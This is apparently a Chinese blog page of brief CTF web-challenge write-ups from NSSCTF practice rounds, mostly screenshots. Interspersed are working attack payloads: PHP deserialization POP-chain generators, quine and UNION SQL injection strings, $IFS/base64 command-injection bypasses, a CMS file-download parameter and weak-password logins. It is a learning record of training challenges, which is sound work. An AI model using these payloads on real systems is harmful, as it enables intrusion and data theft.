+<h1 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h1><p>无从下手,看wp是说允许PUT可以直接写马<br><img src="https://img-blog.csdnimg.cn/b23f31592e46403ca25f067fe8b97a8a.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/60c61275b42c4f2d902bb31c99612130.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e48250195d414cfc8cfde8357367928f.png" alt="在这里插入图片描述"></p>
+<h1 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h1><p><img src="https://img-blog.csdnimg.cn/59b8abc8086a43cd8d0338f24f19de24.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0140f605478347d08595feaf1142488f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/12ace42650064e23b183f01c31d409c5.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-2048"><a href="#HNCTF-2022-Week1-2048" class="headerlink" title="[HNCTF 2022 Week1]2048"></a>[HNCTF 2022 Week1]2048</h1><p><img src="https://img-blog.csdnimg.cn/a9810f40fb934128a8e0202a9f602048.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/bbbf25cf69f643e08b473c1afe647a64.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h1><p><img src="https://img-blog.csdnimg.cn/842cf49bee3d44f1abdaaeb175a31ee0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/251100715b4c485790d314dfd1325dfa.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/351b04e9d3084c9e9bf162fc3f9d974f.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h1><p><img src="https://img-blog.csdnimg.cn/b5fc2d1674bc4a36ab2759007db46b62.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1e2874bcc76443d282bf28026bb226b5.png" alt="在这里插入图片描述"></p>
+<h1 id="HNCTF-2022-Week1-Interesting-include"><a href="#HNCTF-2022-Week1-Interesting-include" class="headerlink" title="[HNCTF 2022 Week1]Interesting_include"></a>[HNCTF 2022 Week1]Interesting_include<img src="https://img-blog.csdnimg.cn/d0e5c8e194814738bee65c7a7c3d2299.png" alt="在这里插入图片描述"></h1><h1 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h1><p><img src="https://img-blog.csdnimg.cn/638f52a6be6c44d7b18ff4afc3c62036.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a6f642ee2dbd448095b73f797e53b634.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/71ad4e4f2f224d57ac1809f40758ce54.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php  
+include &#39;flag.php&#39;;
+class pkshow 
+&#123;  
+    function echo_name()     
+    &#123;          
+        return &quot;Pk very safe^.^&quot;;      
+    &#125;  
+&#125; 
+
+class acp 
+&#123;   
+    protected $cinder;  
+    public $neutron;
+    public $nova;
+    function __construct($p) 
+    &#123;      
+        $this-&gt;cinder = $p;
+    &#125;  
+    function __toString()      
+    &#123;          
+        if (isset($this-&gt;cinder))  
+            return $this-&gt;cinder-&gt;echo_name();      
+    &#125;  
+&#125;  
+
+class ace
+&#123;    
+    public $filename;     
+    public $openstack;
+    public $docker; 
+    public function __construct()&#123;
+        $this-&gt;filename = &#39;../../../../../nssctfasdasdflag&#39;;
+    &#125;
+    function echo_name()      
+    &#123;   
+        $this-&gt;openstack = unserialize($this-&gt;docker);
+        $this-&gt;openstack-&gt;neutron = $heat;
+        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)
+        &#123;
+        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;
+            if (file_get_contents($file))         
+            &#123;              
+                return file_get_contents($file); 
+            &#125;  
+            else 
+            &#123; 
+                return &quot;keystone lost~&quot;; 
+            &#125;    
+        &#125;
+    &#125;  
+&#125;
+
+$ACE = new ace();
+$pop = new acp($ACE);
+
+echo urlencode(serialize($pop));
+</code></pre>
+<h1 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h1><p><img src="https://img-blog.csdnimg.cn/3d97e1d7481e4789983ed02fd19c2429.png" alt="在这里插入图片描述"></p>
+<h1 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h1><p><img src="https://img-blog.csdnimg.cn/0064ffef65db404d88859354785edf04.png" alt="在这里插入图片描述"></p>
+<p>弱口令 admin 12345<br><img src="https://img-blog.csdnimg.cn/1f2119773bf84cbaab13bd06cdc8a0b4.png" alt="在这里插入图片描述"><br>蝉知7.7网上找漏洞<br>然后尝试复现,我当时做的时候可以执行whoami,当时没做完干别的去了,过几天回来做又不能复现rce的漏洞了<br>那就和别人wp里写的一样任意文件下载</p>
+<p><code>?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</code></p>
+<h1 id="SWPUCTF-2022-新生赛-ez-rce"><a href="#SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_rce"></a>[SWPUCTF 2022 新生赛]ez_rce</h1><p><img src="https://img-blog.csdnimg.cn/3a72829bde234c38957f6d45ad6c57fe.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c7b9700a617641a3824f9670e7b03bb6.png" alt="在这里插入图片描述"><br>getshell<img src="https://img-blog.csdnimg.cn/8390e1f8611d4805bdbd48106880fbac.png" alt="在这里插入图片描述"></p>
+<p>直接读flag读不到<br>搜一下flag<br><code>find / -name &quot;flag&quot;</code><br><img src="https://img-blog.csdnimg.cn/889d34047ea94fd985bb799105510811.png" alt="在这里插入图片描述"><br><code>find / -name &quot;flag&quot; -type f -exec cat &#123;&#125; \;</code><br><img src="https://img-blog.csdnimg.cn/cb89a1b37ded4acfa4b228bb31467254.png" alt="在这里插入图片描述"></p>
+<h1 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h1><p><img src="https://img-blog.csdnimg.cn/65cc535c6da441c88368f5b6926bd7f7.png" alt="在这里插入图片描述"><br>base64解码得到flag<br><img src="https://img-blog.csdnimg.cn/5f1aa86fb71b4af2a5ec83d90c0960d7.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h1><p><code>-1))))))union select 1,group_concat(flag)from ctftraining.flag%23</code></p>
+<h1 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h1><p>admin admin 爆hacker<br>然后我在这手工测了一会 没什么思路<br>右键看源码<br>然后跟进<code>/?source</code><br><img src="https://img-blog.csdnimg.cn/62eef944ea5f4ba7b7e0f05d2d7da428.png"><br>意思是传的password和查询的password要相同  quine注入</p>
+<pre><code class="c">1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<p>看wp发现第二种做法<br>phpmyadmin<br>弱口令 admin admin<br><img src="https://img-blog.csdnimg.cn/519bfe00a4d84aa297aeeab283e1e54d.png" alt="在这里插入图片描述"><br> 登录就行了</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/15/NSSCTF%E5%88%B7web(2)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/06/19/NSS%E5%88%B7web(1)/">
+        <h2 class="post-title">NSS刷web(1)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/19
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>一点点做,简单的也不跳了,就当回忆知识了</p>
+<h1 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h1><p>ctrl+u <img src="https://img-blog.csdnimg.cn/ec6cf591aa2d46029b3fd0fa228d8961.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h1><p><img src="https://img-blog.csdnimg.cn/d6def4918e124c65943cef64622c75f3.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1><p><img src="https://img-blog.csdnimg.cn/94467f3d469c41a0a13ba811984270ab.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1><p><img src="https://img-blog.csdnimg.cn/dcda7e85b5444b639bd5c0d76b94121f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ce823b230e14468f93040ff7b83b1363.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1><p><img src="https://img-blog.csdnimg.cn/16c43907d7c647fca6c90647c7e5eccf.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1><p><img src="https://img-blog.csdnimg.cn/5cca341da20e4a96be98a324bc27b521.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1><p><img src="https://img-blog.csdnimg.cn/df7cbcdcdbc74d0a9162ab07cbf470a4.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1><p><img src="https://img-blog.csdnimg.cn/4551cade11554146aeddae03e0232689.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/90298a09dd6a44b08006dbdd85590f46.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1><p>改ua xff<br><img src="https://img-blog.csdnimg.cn/2a569e75c41d4da5b12b4b98bed30a67.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/98ffcbd8907740a1971a51213e56a1f9.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize<img src="https://img-blog.csdnimg.cn/baf376b1d805427188d5bccf194b369e.png" alt="在这里插入图片描述"></h1><p>访问robots.txt<br><img src="https://img-blog.csdnimg.cn/546fcc7a5d324dbd9133f1261b98dfeb.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php
+class wllm&#123;
+
+    public $admin;
+    public $passwd;
+
+    public function __construct()&#123;
+        $this-&gt;admin =&quot;admin&quot;;
+        $this-&gt;passwd = &quot;ctf&quot;;
+    &#125;
+
+        public function __destruct()&#123;
+        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;
+            include(&quot;flag.php&quot;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &quot;Just a bit more!&quot;;
+        &#125;
+    &#125;
+&#125;
+
+$p = new wllm();
+echo serialize($p);
+//O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/fad133c67b7c4e76bb6a123944a17dde.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload2-0"><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h1><p><code>传phtml</code><br><img src="https://img-blog.csdnimg.cn/ac140182b45d4f5aa6f87151b6d2f3f5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/893bf684d1fc4942a9153765fa33b658.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1><p>改mime<br><img src="https://img-blog.csdnimg.cn/de6a146a5bfd4bd6911aaf8b48116d86.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cdfad6a061e642cdad51581cc54b7545.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1><p>绕过wakeup<br>低版本php可以让序列化中属性的个数与实际不符来绕过</p>
+<pre><code class="php">&lt;?php
+
+class HaHaHa&#123;
+
+
+        public $admin;
+        public $passwd;
+
+        public function __construct()&#123;
+            $this-&gt;admin =&quot;admin&quot;;
+            $this-&gt;passwd = &quot;wllm&quot;;
+        &#125;
+
+        public function __wakeup()&#123;
+            $this-&gt;passwd = sha1($this-&gt;passwd);
+        &#125;
+
+        public function __destruct()&#123;
+            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;
+                include(&quot;flag.php&quot;);
+                echo $flag;
+            &#125;else&#123;
+                echo $this-&gt;passwd;
+                echo &quot;No wake up&quot;;
+            &#125;
+        &#125;
+    &#125;
+
+$p = new HaHaHa();
+echo serialize($p);
+
+</code></pre>
+<p>生成的序列化值<br><code>O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code><br>手动改完<br><code>O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/5a67dbe43571481a951fd5ce0999c857.png" alt="在这里插入图片描述"></p>
+<h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>我是做不出来的奥<br>这种sql语句写的属于是第一次见<br>exp<code>*,1</code></p>
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>读useless源码<br><img src="https://img-blog.csdnimg.cn/ea803beaea74445b80f8bad792adf433.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c956aef1b3c543069cbda0f73a6db29c.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">
+&lt;?php  
+
+class Flag&#123;  //flag.php  
+    public $file = &#39;flag.php&#39;;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+$p = new Flag();
+echo serialize($p);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a632a17179f44aae9cbdc9adf3e83bf3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f7db0893033446a19f6a3928b4ab422a.png" alt="在这里插入图片描述"></p>
+<h1 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1><p>扫目录 存在phpinfo.php<br><img src="https://img-blog.csdnimg.cn/a76da7262e0f4a42b9be978e6cfe57d3.png" alt="在这里插入图片描述"></p>
+<h1 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a>[BJDCTF 2020]easy_md5</h1><p>这题是学骚操作的</p>
+<p>开局一个框,啥都没了<br><img src="https://img-blog.csdnimg.cn/7518f6112d0e4730998b67c97bd67b59.png" alt="扫一下"><br>php中md5第二个参数传true会转原始二进制,输入<code>ffifdyop</code><br><img src="https://img-blog.csdnimg.cn/496446475f1d4e20ac5832f7d5a26c81.png" alt="在这里插入图片描述"><br>相当于<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6&#39;</code><br>传参后看源码<br><img src="https://img-blog.csdnimg.cn/834f99fbe7f7433f96c6cfd7f811b822.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fad89123783a437e89e2a930e6888943.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8a13d71c553c496da90a7e0954368460.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p><img src="https://img-blog.csdnimg.cn/7516b266d8e444419b5ad1b1ca10e2e4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4d37f737d82f4252be3cb0172cb605cd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ca44263967754fdfb5e919b864aa0d98.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p><code>http://127.0.0.1/flag.php</code><br>返回提示&#x2F;fl4g<br><img src="https://img-blog.csdnimg.cn/60c1d9277df54336ae7753f8b7204d74.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/010bdd5269b646ec9985ac62a7fc870f.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><p><img src="https://img-blog.csdnimg.cn/9a1cb146043e478b8a01ebd80a082f75.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><p><img src="https://img-blog.csdnimg.cn/a613640232554dfbaaf5c161fe5ea2de.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9f19231344fe4f0f899e21bcd50a8b04.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9bb3720b63fc47cba88368068117a5d7.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a><strong>[SWPUCTF 2021 新生赛]easyupload3.0</strong></h1><p><img src="https://img-blog.csdnimg.cn/e514b36c964e466ca687dbae110729b3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0142c48c39634b78bd6fb91a0a5f998f.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/dd3e182a82e84444bce6945e88a33e2c.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><pre><code class="php">
+&lt;?php
+class w44m&#123;
+
+    private $admin = &#39;aaa&#39;;
+    protected $passwd = &#39;123456&#39;;
+    public function __construct($admin,$passwd)&#123;
+        $this-&gt;admin = $admin;
+        $this-&gt;passwd = $passwd;
+    &#125;
+    public function Getflag()&#123;
+        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
+            include(&#39;flag.php&#39;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &#39;nono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+class w22m&#123;
+    public $w00m;
+    public function __destruct()&#123;
+        echo $this-&gt;w00m;
+    &#125;
+&#125;
+
+class w33m&#123;
+    public $w00m;
+    public $w22m;
+    public function __toString()&#123;
+        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
+        return 0;
+    &#125;
+&#125;
+
+$p = new w22m();
+$w3 = new w33m();
+$p-&gt;w00m = $w3;
+$w4 = new w44m(&#39;w44m&#39;,&#39;08067&#39;);
+$w3-&gt;w00m = $w4;
+$w3-&gt;w22m = &#39;Getflag&#39;;
+echo urlencode(serialize($p)).&quot;\n&quot;;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/658fba11465d4d47b7f82479740e4985.png" alt="在这里插入图片描述"></p>
+<h1 id="NCTF-2018-签到题"><a href="#NCTF-2018-签到题" class="headerlink" title="[NCTF 2018]签到题"></a>[NCTF 2018]签到题</h1><p><img src="https://img-blog.csdnimg.cn/cae95c1e49a34d7e940bef9a6043b46a.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p><img src="https://img-blog.csdnimg.cn/9012ebad333449e282f9b0e681ee1763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7a4fe32e2f114c6fbddad27502452c6b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/26c5d320dc2647e5b60c0831324de3d8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/42c38c74a0624ee38933d0457bdc3b0e.png" alt="在这里插入图片描述"></p>
+<h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>basename会删除文件开头的非ascii码字符<br><img src="https://img-blog.csdnimg.cn/c3ba28302d7d42629590591243878a3b.png" alt="在这里插入图片描述"></p>
+<h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p><img src="https://img-blog.csdnimg.cn/7be56091f8324e9ba0da96b8bbbfaba5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/049ac9bc40ae4de8a153f7058ea076a9.png" alt="在这里插入图片描述"><br>其它方法<br><code>?ip=;ss=g;tac$IFS$9fla$ss.php</code></p>
+<pre><code class="shell">;`echo$IFS$9dGFjICo=|base64$IFS$9-d`
+</code></pre>
+<h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p><img src="https://img-blog.csdnimg.cn/e474425d517b4766bdd202bc821a3767.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1><p><img src="https://img-blog.csdnimg.cn/98a78b6065114370807bf562e5fb85a0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a980ad34b963491384997da74c07b67b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fed5fdce5121404e9e2e356d149f28fe.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37ffe615314a4207af14dd6982f000be.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h1><p><img src="https://img-blog.csdnimg.cn/0a0222862451429cb1ad295470b4598d.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h1><p><img src="https://img-blog.csdnimg.cn/b1d385f829174d9e92bf1e18fa2054ba.png" alt="在这里插入图片描述"><br>存在不可见字符 ,复制粘贴就行<br><img src="https://img-blog.csdnimg.cn/9d8f921904794059a65170b49add6e0c.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h1><p><img src="https://img-blog.csdnimg.cn/632934d96c45477899967f9ced48bea6.png" alt="在这里插入图片描述"></p>
+<h1 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h1><p><img src="https://img-blog.csdnimg.cn/f9c0e6ae883445728ce8c8fb17a3467a.png" alt="在这里插入图片描述"></p>
+<h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>读flag.php 有waf 读index.php<br><img src="https://img-blog.csdnimg.cn/5115a393cb2a4c318c0054177003e89d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ca83edaffa6849409f34f85a33bd8ae0.png" alt="在这里插入图片描述"></p>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>select给ban了 updatexml update 也给ban了<br>考虑堆叠<br><img src="https://img-blog.csdnimg.cn/0293f337fb094459ae0a89253047a31d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/603f0482190949a59878c4952919fb21.png" alt="在这里插入图片描述"><br>这里set 和 prepare也ban了</p>
